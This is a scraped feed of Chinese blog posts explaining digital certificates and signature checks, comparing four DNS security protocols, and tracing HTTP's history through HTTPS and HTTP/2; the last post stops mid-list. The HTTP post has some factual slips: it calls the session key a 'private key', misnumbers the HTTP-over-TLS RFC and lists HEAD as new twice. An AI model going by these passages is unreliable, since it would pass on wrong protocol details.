通常，我们如果访问某些敏感的网页（比如用户登录的页面），其协议都会使用 HTTPS 而不是 HTTP。因为 HTTP 协议是明文的，一旦有坏人在偷窥你的网络通讯，他/她就可以看到网络通讯的内容（比如你的密码、银行帐号、等）；而 HTTPS 是加密的协议，可以保证你的传输过程中，坏蛋无法偷窥。 但是，千万【不要】以为，HTTPS 协议有了加密，就可高枕无忧了。俺再举一个例子来说明，光有加密是不够滴。假设有一个坏人，搞了一个假的网银的站点，然后诱骗你上这个站点。假设你又比较单纯，一不留神，就把你的帐号，口令都输入进去了。那这个坏蛋的阴谋就得逞鸟。 为了防止坏人这么干，HTTPS 协议除了有加密的机制，还有一套证书的机制。通过证书来确保，某个站点确实就是某个站点。 有了证书之后，当你的浏览器在访问某个 HTTPS 网站时，会验证该站点上的 CA 证书（类似于验证介绍信的公章）。如果浏览器发现该证书没有问题（证书被某个根证书信任、证书上绑定的域名和该网站的域名一致、证书没有过期），那么页面就直接打开；否则的话，浏览器会给出一个警告，告诉你该网站的证书存在某某问题，是否继续访问该站点？为了形象起见，下面给出 IE 和 Firefox 的抓图： 大多数知名的网站，如果用了 HTTPS 协议，其证书都是可信的（也就不会出现上述警告）。所以，今后你如果上某个知名网站，发现浏览器跳出上述警告，你就要小心啦！ 验证某文件是否可信（是否被篡改） 证书除了可以用来验证某个网站，还可以用来验证某个文件是否被篡改。具体是通过证书来制作文件的数字签名。制作数字签名的过程太专业，咱就不说了。后面专门告诉大家如何验证文件的数字签名。考虑到大多数人用 Windows 系统，俺就拿 Windows 的例子来说事儿。 比如，俺手头有一个 Firefox 的安装文件（带有数字签名）。当俺查看该文件的属性，会看到如下的界面。眼神好的同学，会注意到到上面有个“数字签名”的标签页。如果没有出现这个标签页，就说明该文件没有附带数字签名。 选择该标签页，看到如下界面。 顺便说一下，某些数字签名中没有包含“邮件地址”，那么这一项会显示“不可用”；同样的，某些数字签名没有包含“时间戳”，也会显示“不可用”。不要紧张，这里显示的“不可用”跟数字签名的有效性【没关系】。 一般来说，签名列表中，有且仅有一个签名。选中它，点“详细信息”按钮。跳出如下界面： 通常这个界面会显示一行字：“该数字签名正常”（图中红圈标出）。如果有这行字，就说明该文件从出厂到你手里，中途没有被篡改过（是原装滴、是纯洁滴）。 如果该文件被篡改过了（比如，感染了病毒、被注入木马），那么对话框会出现一个警告提示“该数字签名无效”（图中红圈标出）。界面如下： 不论签名是否正常，你都可以点“查看证书”按钮。这时候，会跳出证书的对话框。如下： 从后一个界面，可以看到俺刚才说的证书信任链。图中的信任链有3层： 第1层是根证书（Thawte Premium Server CA） 第2层是 Thawte 专门用来签名的证书 第3层是 Mozilla 自己的证书 目前大多数知名的公司（或组织机构），其发布的可执行文件（比如软件安装包、驱动程序、安全补丁），都带有数字签名。你可以自己去看一下。 建议大伙儿在安装软件之前，都先看看是否有数字签名？如果有，就按照上述步骤验证一把。一旦数字签名是坏的，那可千万别装。 ","link":"https://blog.gd1214b.icu/post/SbNCYJUBm/"},{"title":"对比4种强化域名安全的协议——DNSSEC，DNSCrypt，DNS over TLS，DNS over HTTPS","content":" 本文转自:https://program-think.blogspot.com/2018/10/Comparison-of-DNS-Protocols.html 引子 俺在写前一篇博文（也就是 Firefox PK Chrome 那篇）的时候，碰巧看到 Mozilla 官方博客提到说：目前最新的 Firefox 62 版本开始支持【DNS over HTTPS】这一特性（链接在“这里”）。 本来想顺便聊一下“DNS over HTTPS”这个玩意儿。但是查了一下，发现它的 RFC 目前还只是【草案】，尚未正式发布。 所以俺就把本文的主题改成：对比4种强化 DNS 安全的网络协议。然后借此机会普及一些信息安全知识。 DNS 是啥玩意儿？ 简而言之，DNS 是用来查询域名的协议。关于它的原理（工作机制），俺已经写过一篇教程（在“这里”），所以今天就不重复浪费口水啦。 另外，如果你是技术菜鸟，在看这篇博文之前，确保你已经【看完】如下这篇： 《计算机网络通讯的【系统性】扫盲——从“基本概念”到“OSI 模型”》 传统的 DNS 有啥问题？ 传统的 DNS 是一个【比较古老】的协议。最早的草案可以追溯到1983年。1987年定稿之后，基本上没啥变化。算起来，它的年龄比俺博客的很多读者都要大。 设计 DNS 的时候，互联网基本上还是个玩具。那年头的互联网协议，压根儿都没考虑安全性，DNS 当然也不例外。所以 DNS 的交互过程全都是【明文】滴，既无法做到“保密性”，也无法实现“完整性”。 缺乏“保密性”就意味着——任何一个能【监视】你上网流量的人，都可以【看到】你查询了哪些域名。直接引发的问题就是隐私风险。 缺乏“完整性”就意味着——任何一个能【修改】你上网流量的人，都可以【篡改】你的查询结果。直接引发的问题就是“DNS 欺骗”（也叫“DNS 污染”或“DNS 缓存投毒”） 为了解决传统 DNS 的这些弊端，后来诞生了好几个网络协议，以强化域名系统的安全性。俺挑选其中4个来介绍。除了这4个，其它一些协议的名气和影响力太小，不值一提。 下面俺以出场时间的先后，分别介绍这4个协议。 DNSSEC 历史 这玩意儿是“Domain Name System Security Extensions”的缩写。在今天介绍的4个协议中，DNSSEC 是最早诞生的（1997）。从最先的 RFC 2065 进化为 RFC 2535，再到 RFC 4033、RFC 4034、RFC 4035。 在今天介绍的4个协议中，DNSSEC 也是最早大规模部署的。在2010年的时候，所有根域名服务器都已经部署了 DNSSEC。到了2011年，若干顶级域名（.org 和 .com 和 .net 和 .edu）也部署了 DNSSEC。 协议栈 -------- DNSSEC -------- UDP -------- IP -------- 安全性的原理 当初设计 DNSSEC 的一个考虑是“尽可能兼容 DNS 协议”。所以 DNSSEC 只是在 DNS 协议的基础上增加了一个【数字签名机制】。 有了数字签名，如果域名查询的结果被人篡改了，DNSSEC 客户端就可以通过【校验签名】，判断查询结果是假的。套用信息安全的行话——DNSSEC 实现了【完整性】（也叫“不可篡改性”）。 由于 DNSSEC 引入了【数字签名】，就需要有【公私钥对】。私钥是保密的，用来生成签名；公钥是公开的，用来验证签名。DNSSEC 客户端可以向 DNSSEC 服务器发出请求，获得一个 DNSKEY 记录，里面含公钥；然后用这个公钥校验每次的查询结果。 信任链的实现 有些聪明的读者会问了：DESSEC 客户端在向服务器请求公钥的过程中，如果被攻击者篡改了，得到一个假的公钥，那该如何是好？ 为了解决此问题，DNSSEC 体系要求【上级域】来担保。比如想要证明 program-think.blogspot.com 这个域名的公钥是否可信，就依靠 blogspot.com 这个域名的公钥来验证。通过层层追溯，最后达到【根域名服务器】。而“根域名服务器的公钥”是事先就部署在客户端的——这玩意儿就是整个信任链的根源，称之为“信任锚”（洋文叫“Trust Anchor”）。 优点 在今天聊的4个协议中，DNSSEC 应该是最成熟的。除了前面提到的广泛部署，大多数公共的域名服务器也都支持它。维基百科上有一个对照表（链接在“这里”），对比了有名气的几个公共域名服务系统。在今天聊的4个协议中，支持 DNSSEC 的最多。 缺点 虽然 DNSSEC 最成熟，但它有个天生的缺陷——【没有】考虑到【保密性】。 DNSSEC 虽然对传输的数据做了数字签名，但是【没有】进行加密。这就意味着——任何能监视你网络流量的人，也可以看到你通过 DNSSEC 查询了哪些域名。隐私风险大大滴！ Chrome 曾经在 14 版本支持过 DNSSEC，后来又【移除】了；而 Firefox 官方从未支持过 DNSSEC 协议。俺猜测：大概就是这个缺点给闹的。 DNSCrypt 历史 第2个出场的是 DNSCrypt。这个协议是由 Frank Denis 和 Yecheng Fu（付业成）两人设计的。 这个协议从来【没有】提交过 RFC（征求意见稿），要想看它的协议实现，只能去它的官网（链接在“这里”）。 历史上有过两个版本，分别称：Version 1 和 Version 2。如今主要使用“版本2” 协议栈 ---------------- DNSCrypt ---------------- TCP or UDP ---------------- IP ---------------- 安全性的原理 前面俺提到 DNSSEC 协议强调兼容性。而 DNSCrypt 则完全是另起炉灶搞出来的协议。在这个协议中，域名的“查询请求”与“响应结果”都是加密的。这就是它比 DNSSEC 高级的地方。 换句话说，DNSCrypt 既能做到【完整性】，也能做到【保密性】；相比之下，DNSSEC 只能做到【完整性】。 信任链的实现 DNSCrypt 的信任链比较简单——客户端要想使用哪个 DNSCrypt 服务器，就需要预先部署该服务器的公钥。 另外，DNSCrypt 还支持客户端认证（作为可选项）。如果需要的话，可以在服务器上部署客户端的公钥。此时，服务器只接受可信的客户端的查询请求。 优点 如前所述，DNSCrypt 同时支持【完整性】与【保密性】。在隐私方面完胜 DNSSEC。 在下层协议方面，DNSCrypt 同时支持 TCP 和 UDP，显然比 DNSSEC 灵活（DNSSEC 只支持 UDP）。 顺便提醒一下：虽然 DNSCrypt 协议默认使用 443 这个端口号，但该协议与 HTTPS 毫无关系。 缺点 （俺个人认为）DNSCrypt 最大的缺点就是前面提到的：【从未】提交过 RFC。没有 RFC 也就无法通过 IETF（互联网工程任务组）进行标准化。一个无法标准化的协议，其生命力要打很大的折扣。 另一个比较小的缺点是——虽然 DNSCrypt 协议是加密的，但可以被识别出来。换句话说：如果有人监控你的流量，可以识别出哪些流量属于 DNSCrypt 协议。为啥说这是个缺点捏？在本文末尾讨论 “DNSCrypt 与 TLS 的安全性对比” 的时候，会详细加以说明。 再来说说【公共 DNS 系统】。截至俺写本文时，Google 和 Cloudflare 的公共域名系统【尚未】支持 DNSCrypt（参见这个页面的对照表）。这也是一个缺点。 DNS over TLS “DNS over TLS”有时也被简称为【DoT】。为了打字省力，本文以下部分用 DoT 来称呼之。 历史 DoT 已经正式发布了 RFC（参见 RFC 7858 和 RFC 8310）。 从时间上看，RFC7858 是2016年发布的，RFC8310 是今年（2018）发布的；显然，这个协议出现得比较晚（相比前面提到的 DNSSEC 和 DNSCrypt）。 协议栈 -------- DoT -------- TLS -------- TCP -------- IP -------- 安全性的原理 顾名思义，DNS over TLS 就是基于 TLS 隧道之上的域名协议。由于 TLS 本身已经实现了【保密性】与【完整性】，因此 DoT 自然也就具有这两项特性。 至于 TLS 协议是如何实现完整性与保密性滴？可以参见俺的系列博文：《扫盲 HTTPS 和 SSL/TLS 协议》 信任链的实现 DoT 的信任链依赖于 TLS，而 TLS 的信任链靠的是 CA 证书体系。 关于 CA 证书体系，可以参见8年前的博文：《数字证书及 CA 的扫盲介绍》 优点 相比 DNSSEC，DoT 具备了【保密性】；相比 DNSCrypt，DoT 已经标准化。 另外，由于 DoT 协议是完全包裹在 TLS 里面，即使有人监视你的上网流量，也无法判断——哪些 TLS 流量是用于域名查询，哪些 TLS 用于网页传输。换句话说，DoT 协议的流量无法被【单独识别】出来。 缺点 支持 DoT 的客户端还不够多。尤其是主流的浏览器还没有计划增加 DoT 的支持。 DNS over HTTPS “DNS over HTTPS”有时也被简称为【DoH】。为了打字省力，本文以下部分用 DoH 来称呼之。 历史 在今天介绍的4个协议中，DoH 是最新的（最晚出现的）。RFC 方面，它已经有了相应的草案，但还【没有】正式发布。截至俺写本文时，DoH 的草案已经发了 15 个版本（从 00 到 14），最新版的链接在“这里”。 很多人把 DoH 与 DoT 混为一谈，实际上这是两种不同的协议。你可以对比这两者的协议栈，（只要你眼睛不瞎）就可看出其中的差别。 协议栈 -------- DoH -------- HTTP -------- TLS -------- TCP -------- IP -------- 安全性的原理 顾名思义，DNS over HTTPS 就是基于 HTTPS 隧道之上的域名协议。而 HTTPS 又是“HTTP over TLS”。所以 DoH 相当于是【双重隧道】的协议。 与 DoT 类似，DoH 最终也是依靠 TLS 来实现了【保密性】与【完整性】。 至于 TLS 协议是如何实现完整性与保密性滴？可以参见俺的系列博文：《扫盲 HTTPS 和 SSL/TLS 协议》 【信任链】的实现 DoH 类似于 DoT，最终是靠 TLS 所使用的“CA 证书体系”来实现信任链。 关于 CA 证书体系，可以参见8年前的博文：《数字证书及 CA 的扫盲介绍》 优点 基本上，DoT 具备的优点，DoH 也具备。 相比 DoT，DoH 还多了一个优点： 由于 DoH 是基于 HTTP 之上。而主流的编程语言都有成熟的 HTTP 协议封装库；再加上 HTTP 协议的使用本身很简单。因此，要想用各种主流编程语言开发一个 DoH 的客户端，是非常容易滴。 缺点 如前所述，DoH 目前还只有 RFC 的草案，尚未正式发布。这算是一个缺点。 相比 DoT，DoH 还有一个小缺点——由于 DoH 比 DoT 多了一层（请对比两者的协议栈），所以在性能方面，DoH 会比 DoT 略差。为啥说这是个【小】缺点捏？因为域名的查询并【不】频繁，而且客户端软件可以很容易地对域名的查询结果进行【缓存】（以降低查询次数）。所以 DoH 比 DoT 性能略差，无伤大雅。 4种协议的综合对照表 为了给列位看官一个直观的印象，放一个综合的对照表。 为啥 DNS over HTTPS 更有前途？——谈谈俺个人观点 接着来聊一下：4个协议中，谁的前景最看好？（以下是俺个人观点，仅供参考） 首先【排除】DNSSEC 如果要讨论这4种协议的优劣，首先【出局】的是 DNSSEC。因为这玩意儿连【保密性】都不具备，无法保护网民的隐私。相比之下，另外三种协议都具备了“保密性”。 （注：DNSSEC 具备“完整性”，不具备“保密性”） DNSCrypt 与 TLS 的对比 DoT 与 DoH 这两个协议，本质上都是依赖 TLS 来保证安全性（完整性＆保密性）。所以剩下三种协议的对比，首先是 DNSCrypt 与 TLS 之间的 PK。 俺认为 TLS 具有如下几个优势： 优势1——关于“标准化” SSL/TLS 老早就已经标准化了，距今已超过20年。（关于 SSL/TLS 版本的演变历史，可以参见这篇博文） 而 DNSCrypt 发布这么多年，连 RFC 都没有提交过——这玩意儿看来【没希望】成为互联网标准了。 优势2——关于“客户端部署” TLS 的公钥体系（CA 证书体系）早就已经普及。所有主流的操作系统都内置了一系列 CA 根证书。 相比之下，DNSCrypt 另起炉灶搞了一套公钥机制，只有它自己在用。 所以，在【部署客户端】的时候，DNSCrypt 会比 TLS 麻烦。虽然某些 DNSCrypt 的客户端已经内置了一些知名的公共服务器的公钥，但如果你要切换到另一个 DNSCrypt 服务器，并且该服务器的公钥没有内置在客户端里面，那你就需要手动部署。 优势3——关于“协议识别” 这个话题前面已经谈过了。此处再重复唠叨一下。 如果网络流量被监控，监控者可以根据协议特征，把 DNSCrypt 识别出来；而 DoT 与 DoH，在流量外观上，与其它的 TLS 流量【毫无差异】。也就是说，监控流量的人，无法判断某个 TLS 流量是否属于 DoT 或 DoH。 综上所述，TLS 完胜 DNSCrypt。所以，剩下的协议就只有 DoT 与 DoH。 DoT VS DoH 前面谈 DoH 优缺点的时候，其实已经可以看出这两者谁更有前途了。 DoT 因为协议栈少了一层，性能会比 DoH 更好。但是俺前面也说了，域名查询的频度是比较低的，而且还可以利用客户端软件的【DNS 缓存】，进一步减少域名查询的频度。所以 DoT 虽然性能更好，但优势不明显。 DoH 的强项体现在如下几方面： 1. 编程接口更简单 （关于这点，前面提到过）这是个很重要的优势——有助于让更多软件切换到 DoH 之上。 2. 可以利用 HTTP 协议已有的特性 由于 DoH 是基于 HTTPS 之上，可以无缝地支持 Proxy； DoH 可以充分利用 HTTP 2.0 的特性（HTTP/2 在 HTTP/1.1 基础上加了很多功能）。 正是因为 DoH 的这些优势，浏览器厂商对 DoH 的支持更积极。对比一下就可以看出来——DoT 在两年前（2016）正式发布 RFC，主流的浏览器没一个支持；而 DoH 目前才仅仅是 RFC 草案，Firefox 与 Chrome/Chromium 都开始支持了。 小结 经过层层淘汰，目前看下来最有前途的应该 DoH（DNS over HTTPS）。 DoH 未来的发展势头取决于如下几点： 标准化的时间进度（看目前的架势，正式发布应该快到了） 其它浏览器跟进的速度 对 DoH 的进一步讨论 引申阅读 分享几篇 DoH 相关的文章： 《A cartoon intro to DNS over HTTPS》 （注：这是 Mozilla 官方博客的一篇文章，深入浅出地扫盲了 DNS 和 DoH 的原理） 《The Benefits of HTTPS for DNS》 （注：这是某个老外写的技术文章，讨论 DoH 可以借助 HTTP 协议的哪些好处） 关于浏览器的说明 Firefox Firefox 从 62 版本开始支持 DoH，具体参见 Mozilla 官方博客（链接在“这里”）。 由于 DoH 功能刚刚加入，还没有提供相应的配置界面。如果你想体验该功能，需要定制 Firefox 的配置选项（Preferences）以初始化 DoH 的相关参数。定制 Firefox 的方法参见博文：《扫盲 Firefox 定制——从“user.js”到“omni.ja”》 Chrome/Chromium Chrome/Chromium 从 66 版本开始支持 DoH。具体参见 Chromium 官网的 issue（链接在“这里”）。 虽然 Firefox 和 Chrome/Chromium 都已经开始支持 DoH，但大伙儿别急着用。 按照历史经验，刚加入的新功能，可能还不够稳定，没准儿还存在未曝光的安全漏洞。多等几个版本之后再说。 相关的客户端工具 在 curl 官方的代码仓库，有一个关于 DoH 的 wiki 页面，里面列出了一些 DoH 的客户端小工具。 喜欢折腾技术的同学，可以先去玩一玩。 因为 DoH 的标准还没有正式发布，关于它的讨论就到此为止。等到啥时候发布了，俺再专门发一篇 DoH 如何使用的博文。 ","link":"https://blog.gd1214b.icu/post/ee3pG-Qog/"},{"title":"当我谈 HTTP 时，我谈些什么?","content":" 当我们打开网站时也许不会去留意网站前面的HTTP是怎么来的。但是它毫无疑问在网络中有着举足轻重的地位。本文从起源到发展，详说HTTP从1到3的演变。 说在前面 本文不致力于讲完 HTTP 的全部内容，事实上短短的篇幅也不可能讲完。本文也无意于深挖 HTTP 中的某一点，这是像 《HTTP 权威指南》或者是 RFC 协议做的事。 本文目标是帮助读者理清 HTTP 的演化过程，说说 HTTP 变化的那些事。 HTTP 的起源 HTTP 最初是 Tim BernersLee 1989 年在欧洲核子研究组织（CERN）所发起的。Tim BernersLee 提出了一种能让远隔两地的研究者们共享知识的设想。这个设想的基本理念是：借助多文档之间相互关联形成的超文本（HyperText），连成可相互参阅的 WWW（World Wide Web，万维网）。用于传输的超文本传输协议（HyperText Transfer Protocol），即 HTTP 由此诞生。 WWW 这一名称，是 Web 浏览器当年用来浏览超文本的客户端应用程序时的名称。现在则用来表示这一系列的集合，也可简称为 Web。 HTTP 本身是一个简单的请求-响应协议，它通常运行在 TCP 之上。从整个网络模型来看，HTTP 是应用层的一个协议。在 OSI 七层模型中，HTTP 位于最上层。它并不涉及数据包的传输，只是规定了客户端和服务器之间的通信格式。定了客户端可能发送给服务器什么样的消息以及得到什么样的响应。请求和响应消息的头以 ASCII 码形式给出。 HTTP 采用 BS 架构，也就是浏览器到服务器的架构，客户端通过浏览器发送 HTTP 请求给服务器，服务器经过解析响应客户端的请求。就是这个简单实用的模型，使得 HTTP 这个基于 TCP/IP 的协议迅速推广。 HTTP/0.9 到 HTTP/1.1 HTTP 的演化并不是一蹴而就的。当年 HTTP 的出现主要是为了解决文本传输的难题。由于协议本身非常简单，于是在此基础上设想了很多应用方法并投入了实际使用。现在 HTTP 已经超出了 Web 这个框架的局限，被运用到了各种场景里。 HTTP/0.9 HTTP 协议最早的一个版本是 1990 年发布的 HTTP/0.9。 前面说到，HTTP 于 1989 年问世。那时的 HTTP 并没有作为正式的标准被建立。这时的 HTTP 其实含有 HTTP/1.0 之前版本的意思，因此被称为 HTTP/0.9。这个版本只有一个命令：GET。通过 GET 可以获取服务器的资源，比如请求服务器根目录下的 index.html 文件。这个版本的协议规定，服务器只能回应 HTML 格式的字符串，不能回应其它格式，也就是说图像、视频等多媒体资源，在 HTTP/0.9 这个版本上是无法进行传输的。 HTTP/1.0 HTTP 正式作为标准被公布是在 1996 年的 5 月，版本被命名为 HTTP/1.0，并记载于 RFC1945 。虽说是初期标准，但该协议标准至今仍被广泛使用在服务器端。 HTTP/1.0 版本发布，增加了 POST 命令和 HEAD 命令，丰富了浏览器与服务器的互动手段。这个版本的 HTTP 协议可以发送任何格式的内容，包括传输文字、图像、视频、文件等，这为互联网的大发展奠定了基础。 HTTP/1.0 除了增加了请求方法以及对发送文件的支持之外，还增加了格式的改变。除了数据部分，每次通信都必须包括头信息（HTTP header），用来描述一些元数据。另外还增加了状态码、多字符集支持、多部分发送（multi-part type）、权限（authorization）、缓存（cache）、内容编码（content encoding）等等。 HTTP/1.1 HTTP/1.0 版也并不是完美的，它的主要缺点是，每一次建立 TCP 连接只能发送一个请求。发送数据完毕，连接就关闭，如果还要请求其他资源，就必须再新建一个连接。如果多次请求，势必就会对服务器产生较大的资源性能损耗。 1997 年 1 月公布的 HTTP/1.1 是目前主流的 HTTP 协议版本。当初的标准是 RFC2068，之后发布的修订版 RFC2616 就是当前的最新版本。 其中最著名的是 1999 年 6 月公布的 RFC 2616，定义了 HTTP 协议中现今广泛使用的一个版本——HTTP/1.1。 这个版本最大的变化就是将持久化连接加入了 HTTP 标准，即 TCP 连接默认不关闭，可以被多个请求复用。此外，HTTP/1.1 版还新增了许多方法，例如：PUT、PATCH、HEAD、OPTIONS、DELETE。得到进一步完善的HTTP/1.1 版本，一直沿用至今。 HTTP 协议简单介绍 请求 客户端发送一个 HTTP 请求到服务器，请求消息包括以下格式： 请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。 Get 请求例子 &gt; GET / HTTP/1.1 &gt; Host: www.baidu.com &gt; User-Agent: curl/7.52.1 &gt; Accept: / 第一部分：请求行，用来说明请求类型，要访问的资源以及所使用的 HTTP 版本。 第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息 从第二行起为请求头部，HOST 将指出请求的目的地。User-Agent，服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础。该信息由你的浏览器来定义，并且在每个请求中自动发送等等。 第三部分：空行，请求头部后面的空行是必须的 即使第四部分的请求数据为空，也必须有空行。 第四部分：请求数据也叫主体，可以添加任意的其他数据。 这个例子的请求数据为空。 响应消息 一般情况下，服务器接收并处理客户端发过来的请求后，会返回一个 HTTP 的响应消息。 HTTP 响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。 例子： &lt; HTTP/1.1 200 OK &lt; Accept-Ranges: bytes &lt; Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform &lt; Connection: keep-alive &lt; Content-Length: 2381 &lt; Content-Type: text/html &lt; Date: Thu, 11 Jun 2020 16:04:33 GMT &lt; Etag: &quot;588604c8-94d&quot; &lt; Last-Modified: Mon, 23 Jan 2017 13:27:36 GMT &lt; Pragma: no-cache &lt; Server: bfe/1.0.8.18 &lt; Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/ &lt; <!DOCTYPE html> &lt;meta HTTP-equiv=content-type content=text/html;charset=utf-8&gt;&lt;meta HTTP-equiv=X-UA-Compatible content=IE=Edge&gt;... 第一部分：状态行，由 HTTP 协议版本号、状态码、状态消息三部分组成。 第一行为状态行，（HTTP/1.1）表明 HTTP 版本为 1.1 版本，状态码为 200，状态消息为（ok） 第二部分：消息报头，用来说明客户端要使用的一些附加信息 第二行和第三行为消息报头。 Date：生成响应的日期和时间；Content-Type：指定了 MIME 类型的 HTML(text/html)，编码类型是 UTF-8 第三部分：空行，消息报头后面的空行是必须的 第四部分：响应正文，服务器返回给客户端的文本信息。 空行后面的 HTML 部分为响应正文。 状态码 状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别: 1xx：指示信息–表示请求已接收，继续处理 2xx：成功–表示请求已被成功接收、理解、接受 3xx：重定向–要完成请求必须进行更进一步的操作 4xx：客户端错误–请求有语法错误或请求无法实现 5xx：服务器端错误–服务器未能实现合法的请求 安全性与 HTTPS HTTP 的诞生是为了解决信息传递和共享的问题，并没有考虑到互联网高速发展后面临的安全问题。 一般来说 HTTP 从 TCP 三次握手后，便开始了数据传输。由于 HTTP 本身以明文形式来传输数据，并不具备任何数据加密、身份校验的机制。同时下层协议并不对数据安全性、保密性提供保证。所以在网络传输的过程中，任意节点的第三方都可以随意劫持流量、篡改数据或窃取信息。 HTTP 无法确保数据的保密性、完整性和真实性，已经不能适应现代互联网应用的安全需求。 随着 Web 的日益壮大，HTTP 的使用呈巨额增长趋势，对信息安全的需求也愈来愈迫切，SSL（Secure SocketsLayer ，安全套接层）应运而生。 当对于安全需求，首先想到的就是对信息进行加密。SSL ，安全套接层，顾名思义是在 TCP 上提供的安全套接字层。其位于应用层和传输层之间，应用层数据不再直接传递给传输层而是传递给 SSL 层，SSL 层对从应用层收到的数据进行加密，利用数据加密、身份验证和消息完整性验证机制，为网络上数据的传输提供安全性保证。HTTPS 便是指 Hyper Text Transfer Protocol over SecureSocket Layer。 谈到具体实施上，业内通常采用的一般有对称加密和非对称加密。采用何种方式进行加密？如何判断服务器未被篡改？如何传递加密密钥？带着这样的问题，我们来看看 HTTPS 的工作流程。 HTTPS 的工作流程 1、客户端发起 HTTPS 请求 这个没什么好说的，就是用户在浏览器里输入一个 HTTPS 网址，然后连接到 server 的 443 端口。 2、服务端的配置 采用 HTTPS 协议的服务器必须要有一套数字证书，可以自己制作，也可以向组织申请，区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面（Let‘s Encrypt 就是个不错的选择，免费的 SSL 证书）。 这套证书其实就是一对公钥和私钥，如果对公钥和私钥不太理解，可以想象成一把钥匙和一个锁头，只是全世界只有你一个人有这把钥匙，你可以把锁头给别人，别人可以用这个锁把重要的东西锁起来，然后发给你，因为只有你一个人有这把钥匙，所以只有你才能看到被这把锁锁起来的东西。 3、传送证书 这个证书其实就是公钥，只是包含了很多信息，如证书的颁发机构，过期时间等等。 4、客户端解析证书 这部分工作是有客户端的 TLS 来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。 如果证书没有问题，那么就生成一个随机值，然后用证书对该随机值进行加密，就好像上面说的，把随机值用锁头锁起来，这样除非有钥匙，不然看不到被锁住的内容。 5、传送加密信息 这部分传送的是用证书加密后的随机值，目的就是让服务端得到这个随机值，以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了。 6、服务段解密信息 服务端用私钥解密后，得到了客户端传过来的随机值(私钥)，然后把内容通过该值进行对称加密，所谓对称加密就是，将信息和私钥通过某种算法混合在一起，这样除非知道私钥，不然无法获取内容，而正好客户端和服务端都知道这个私钥，所以只要加密算法够彪悍，私钥够复杂，数据就够安全。 7、传输加密后的信息 这部分信息是服务段用私钥加密后的信息，可以在客户端被还原。 8、客户端解密信息 客户端用之前生成的私钥解密服务段传过来的信息，于是获取了解密后的内容，整个过程第三方即使监听到了数据，也束手无策。 SSL 的演化 简单说完了 HTTPS 的工作流程。让我们再将注意力放在 SSL 的演化上。 1994年，Netscape 创建了 SSL 协议的原始规范并逐步发布协议改进版本。1995 年发布 SSL 2.0。1996年，Netscape 和 Paul Kocher 共同设计发布 SSL 3.0 协议，获得互联网广泛认可和支持。因特网工程任务组（IETF）接手负责该协议，并将其重命名为 TLS（传输层安全）协议。 我们看到，SSL 2.0 规范是在 1995 年左右发布的，而 SSL 3.0 是在 1996 年 11 月发布的。有趣的是，SSL 3.0 是在 RFC 6101 中描述的，该 RFC 于 2011 年 8 月发布。它位于历史类别中，该类别通常是被考虑和被丢弃的文档想法，或者是在决定记录它们时已经具有历史意义的协议（根据 IETF 说明）。在这种情况下，有一个描述 SSL 3.0 的 IETF 文档是很有必要的，因为在其可以被用作规范参考。 再来看看，SSL 是如何激发 TLS 的发展的。后者在 1996 年 11 月以 draft-ietf-tls-protocol-00 宣告开始。它经历了六个草案版本，并于 1999 年初作为 RFC 2246 - TLS 1.0 正式发布。 在 1995 和 1999 年间，SSL 和 TLS 协议用于保护互联网上的 HTTP 通信。这作为事实上的标准运行良好。直到 1998 年 1 月，随着 I-D draft-ietf-tls-HTTPs-00 的发布，HTTPS 的正式标准化过程才开始。该工作于 2000 年 5 月以 RFC 2616 - HTTP 上的 TLS 的发布结束。 TLS 在 2000 到 2007 年间继续发展，标准化为 TLS 1.1 和 1.2。直至七年后，TLS 的下一个版本开始进行，该版本在 2014 年四月被采纳为 draft-ietf-tls-tls13-00 ，并在 28 份草稿后，于 2018 年八月出了完成版本 RFC 8446- TLS 1.3。 改进与 HTTP2 回到 HTTP 本身。在很长一段时间里，HTTP/1.1 已经足够好了（确实是，现在仍应用最为广泛），但是，Web 不断变化的需求使得我们需要一个更好更合适的协议。 HTTP/1.1 自从 1997 年发布以来，我们已经使用 HTTP/1.x 相当长一段时间了。但随着互联网近十年爆炸式的发展，从当初网页内容以文本为主，到现在以富媒体（如图片、声音、视频）为主，而且对页面内容实时性高要求的应用越来越多（比如聊天、视频直播），所以当时协议规定的某些特性，已经逐渐无法满足现代网络的需求了。 如果你有仔细观察，那些最流行的网站首页所需要下载资源的话，会发现一个非常明显的趋势。近年来加载网站首页需要下载的数据量在逐渐增加，并已经超过了 2100K。但在这里我们更关心的是：平均每个页面为了完成显示与渲染所需要下载的资源数也已经超过了 100 个。 基于此，在 2010 年到 2015 年，谷歌通过实践一个实验性的 SPDY 协议，证明了一个在客户端和服务器端交换数据的另类方式。其收集了浏览器和服务器端的开发者的焦点问题，明确了响应数量的增加和解决复杂的数据传输。在启动 SPDY 这个项目时预设的目标是： 页面加载时间 （PLT） 减少 50%。 无需网站作者修改任何内容。 将部署复杂性降至最低，无需变更网络基础设施。 与开源社区合作开发这个新协议。 收集真实性能数据，验证这个实验性协议是否有效。为了达到降低目标，减少页面加载时间的目标，SPDY 引入了一个新的二进制分帧数据层，以实现多向请求和响应、优先次序、最小化及消除不必要的网络延迟，目的是更有效地利用底层 TCP 连接。 HTTP/1.1 有两个主要的缺点：安全不足和性能不高，由于背负着 HTTP/1.x 庞大的历史包袱，所以协议的修改，兼容性是首要考虑的目标，否则就会破坏互联网上无数现有的资产。 而如上图所示，SPDY 位于 HTTP 之下，TCP 和 SSL 之上，这样可以轻松兼容老版本的 HTTP 协议同时可以使用已有的 SSL 功能。 SPDY 协议在 Chrome 浏览器上证明可行以后，就被当作 HTTP/2 的基础，主要特性都在 HTTP/2 之中得到继承。 于是时间来到 2015 年，HTTP/2.0 问世。 HTTP/2 相比 HTTP/1.1 的修改并不会破坏现有程序的工作，但是新的程序可以借由新特性得到更好的速度。 HTTP/2 保留了 HTTP/1.1 的大部分语义，例如请求方法、状态码、乃至 URI 和绝大多数 HTTP 头部字段一致。而 HTTP/2 采用了新的方法来编码、传输客户端和服务器间的数据。 来看看 HTTP/2 的具体特点： 